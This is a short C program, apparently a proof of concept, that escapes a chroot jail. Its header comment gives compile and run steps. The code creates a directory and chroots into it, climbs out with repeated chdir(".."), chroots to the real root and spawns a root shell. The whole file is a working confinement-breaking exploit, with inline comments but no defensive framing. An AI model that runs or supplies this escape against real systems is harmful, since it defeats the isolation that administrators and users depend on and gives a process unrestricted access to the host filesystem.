/**
 * gcc -o rechroot rechroot.c
 * sudo chroot /tmp/jail /bin/bash
 * ./rechroot
 */
#include <errno.h>
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

int main(void) {
    // EEXIST is fine here (a previous run may have already created it)
    if (mkdir("foo", 0755) != 0 && errno != EEXIST) {
        perror("mkdir");
        return 1;
    }

    // re-chroot into it; cwd is still the *old* root, now outside it
    if (chroot("foo") != 0) {
        perror("chroot");
        return 1;
    }

    for (int i = 0; i < 16; i++)
        chdir("..");      // climb past the old jail root, into the real filesystem

    if (chroot(".") != 0) {   // process root is now the real /
        perror("chroot");
        return 1;
    }

    execl("/bin/sh", "sh", (char *)NULL);
    perror("execl");
    return 1;
}